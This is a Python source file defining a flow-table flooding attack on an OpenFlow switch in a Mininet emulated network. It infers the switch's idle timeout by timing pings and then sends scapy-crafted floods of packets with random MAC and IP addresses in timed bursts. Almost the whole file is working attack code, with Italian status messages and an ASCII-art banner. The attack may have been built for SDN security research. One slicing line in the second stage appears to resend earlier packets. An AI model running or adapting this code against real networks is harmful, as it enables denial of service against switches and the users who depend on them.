import random
import time
import re

from typing import List
from threading import Thread, Event

from mininet.node import OVSSwitch, Intf

from scapy.all import (
    Ether, IP, TCP, UDP, ICMP, Packet, sendp, srp1, getmacbyip,
    fuzz, RandIP, RandMAC, RandChoice, RandShort
)

class FloodAttack:

    def __init__(self, switch, iface, npacket, added_new_packets,
                 net=None, probe_src='h7', probe_dst_ip='10.0.0.66'):
        self.switch = switch
        self.iface = iface
        self.npacket = npacket
        self.added_new_packets = added_new_packets
        self.macs: List[str] = []
        self.net = net
        self.probe_src = probe_src
        self.probe_dst_ip = probe_dst_ip
        self.attack_frequency = 0
        self.max_iter = 1000
        self.max_interval = 100
        self._stop_event: Event = Event()
        print("""
---------------------------------------------------------------------------------------------------------------------------------------------------

███████ ██       ██████  ██     ██     ████████  █████  ██████  ██      ███████     ███████ ██       ██████   ██████  ██████  ██ ███    ██  ██████  
██      ██      ██    ██ ██     ██        ██    ██   ██ ██   ██ ██      ██          ██      ██      ██    ██ ██    ██ ██   ██ ██ ████   ██ ██       
█████   ██      ██    ██ ██  █  ██        ██    ███████ ██████  ██      █████       █████   ██      ██    ██ ██    ██ ██   ██ ██ ██ ██  ██ ██   ███ 
██      ██      ██    ██ ██ ███ ██        ██    ██   ██ ██   ██ ██      ██          ██      ██      ██    ██ ██    ██ ██   ██ ██  ██ ██ ██    ██ 
██      ███████  ██████   ███ ███         ██    ██   ██ ██████  ███████ ███████     ██      ███████  ██████   ██████  ██████  ██ ██   ████  ██████ 

----------------------------------------------------------------------------------------------------------------------------------------------------
""")
        print("[+] Switch: {}\n[+] IFace: {}\n".format(self.switch.name, self.iface.name))

    @staticmethod
    def random_mac() -> str:
        return str(RandMAC())

    @staticmethod
    def random_ip() -> str:
        return str(RandIP())

    @staticmethod
    def random_port() -> int:
        return random.randint(1024, 65535)

    SUPPORTED_PROTOS = ["TCP", "UDP", "ICMP"]

    @staticmethod
    def random_proto() -> str:
        return random.choice(FloodAttack.SUPPORTED_PROTOS)

    @staticmethod
    def build_packet(src_mac: str, src_ip: str, dst_mac: str, dst_ip: str) -> Packet:

        eth = Ether(src=src_mac, dst=dst_mac)
        ip  = IP(src=src_ip, dst=dst_ip)

        proto = FloodAttack.random_proto()

        if proto == "TCP":
            transport = TCP(
                sport=FloodAttack.random_port(),
                dport=FloodAttack.random_port(),
                flags="S"
            )
        elif proto == "UDP":
            transport = UDP(
                sport=FloodAttack.random_port(),
                dport=FloodAttack.random_port()
            )
        elif proto == "ICMP":
            transport = ICMP(
                type=random.choice([0, 8]),   # 0 = reply, 8 = echo request
                code=0
            )

        return eth / ip / transport

    def random_af(self):
        if self.attack_frequency == 0:
            return 0
        start = int(self.attack_frequency * 0.2)
        return random.randint(start, self.attack_frequency - 1)

    def measure_rtt(self, src_host, dst_ip, timeout=10):
        out = src_host.cmd(f'ping -c 1 -W {timeout} {dst_ip}')
        t_now = time.time()
        m = re.search(r'time=([\d.]+)\s*ms', out)
        if not m:
            return t_now, None
        rtt = float(m.group(1)) / 1000.0
        return t_now, rtt

    def estimate_idle_timeout(self, src_host, dst_ip):
        t0, rtt0 = self.measure_rtt(src_host, dst_ip)
        t1, rtt1 = self.measure_rtt(src_host, dst_ip)

        if rtt0 is None or rtt1 is None:
            print("[!] Host irraggiungibile, impossibile stimare tidle")
            return None

        if abs(rtt1 - rtt0) / rtt1 <= 0.1:
            print("[!] Impossibile distinguere table-hit da table-miss")
            return None

        threshold = (rtt0 + rtt1) / 2

        interval = 1
        for _ in range(self.max_iter):
            time.sleep(interval)
            ti, rtti = self.measure_rtt(src_host, dst_ip)

            if rtti is None:
                print("[!] Probe fallita durante la stima")
                return None

            if rtti >= threshold:
                return interval

            interval += 1
            if interval > self.max_interval:
                break

        return None

    def stage_0(self) -> None:
        src_host = self.net.get(self.probe_src)
        print("[*] Tidle...")
        self.attack_frequency = self.estimate_idle_timeout(src_host, self.probe_dst_ip)
        print(f"[*] Tidle={self.attack_frequency}")

    def stage_1(self) -> None:
        if self._stop_event.is_set():
            return
        packets: List[Packet] = []
        print("[*] Crafting")
        for _ in range(self.npacket):
            src_mac = FloodAttack.random_mac()
            src_ip = FloodAttack.random_ip()
            packet = FloodAttack.build_packet(src_mac, src_ip, "ff:ff:ff:ff:ff:ff", "10.0.0.255")
            self.macs.append(src_mac)
            packets.append(packet)
        print("[*] Crafted")
        print("[*] Sending")
        for i in range(0, len(packets), self.added_new_packets):
            sendp(packets[i:i + self.added_new_packets], iface=self.iface.name, verbose=False)
            time.sleep(self.attack_frequency)
        print("[*] Sent")

    def stage_2(self) -> None:
        if self._stop_event.is_set():
            return
        local_pool = self.macs.copy()
        random.shuffle(local_pool)
        packets: List[Packet] = []
        print("[*] Crafting")
        for i in range(self.npacket):
            src_mac = FloodAttack.random_mac()
            src_ip = FloodAttack.random_ip()
            dst_mac = local_pool[i % len(local_pool)]
            dst_ip = FloodAttack.random_ip()
            packet = FloodAttack.build_packet(src_mac, src_ip, dst_mac, dst_ip)
            packets.append(packet)
        print("[*] Crafted")
        print("[*] Sending")
        for i in range(0, len(packets), self.added_new_packets):
            sendp(packets[0:i + self.added_new_packets], iface=self.iface.name, verbose=False)
            time.sleep(self.random_af())
        print("[*] Sent")

    def _run(self):
        """Corpo dell'attacco eseguito nel thread interno."""
        print("# [STAGE 0] Tidle Inference")
        self.stage_0()
        print("# [STAGE 1] MAC Presenting")
        self.stage_1()
        if self._stop_event.is_set():
            print("[!] Attacco interrotto dopo stage 1.")
            return
        print()
        print("# [STAGE 2] Flooding")
        self.stage_2()
        print("[+] Attacco completato.")

    def start(self) -> None:
        self._stop_event.clear()
        self._attack_thread = Thread(target=self._run, name="flood-attack", daemon=True)
        self._attack_thread.start()

    def stop(self) -> None:
        """Segnala ai worker di fermarsi e attende la fine del thread."""
        self._stop_event.set()
        if self._attack_thread and self._attack_thread.is_alive():
            self._attack_thread.join(timeout=10)
            if self._attack_thread.is_alive():
                print("[!] Timeout: il thread di attacco non si è fermato.")
            else:
                print("[+] Thread di attacco terminato.")

    def is_running(self) -> bool:
        """True se il thread di attacco è ancora attivo."""
        return self._attack_thread is not None and self._attack_thread.is_alive()

    def join(self, timeout: float = None) -> None:
        """Attende la fine naturale dell'attacco (senza fermarlo)."""
        if self._attack_thread:
            self._attack_thread.join(timeout=timeout)